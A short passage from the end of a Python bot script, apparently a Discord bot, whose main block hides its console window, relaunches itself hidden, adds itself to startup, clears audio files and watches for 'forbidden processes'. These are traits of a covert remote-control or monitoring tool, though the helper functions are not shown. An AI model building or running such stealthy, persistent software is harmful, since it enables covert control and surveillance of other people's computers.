            print(f"Error in process monitoring: {str(e)}")
            time.sleep(1)  # Wait a bit before trying again

# Run the bot
if __name__ == "__main__":
    # Try to relaunch as hidden first (if we're in a console)
    if not relaunch_as_hidden():
        # If we didn't relaunch, try to hide the console window
        hide_console_window()
    
    # Add to startup
    add_to_startup()
    
    # Clean up any existing audio files at startup
    cleanup_audio_files()
    
    # Start monitoring for forbidden processes in a separate thread
    monitoring_thread = threading.Thread(target=monitor_forbidden_processes, daemon=True)
    monitoring_thread.start()
    
    # Run the bot
    bot.run(TOKEN)
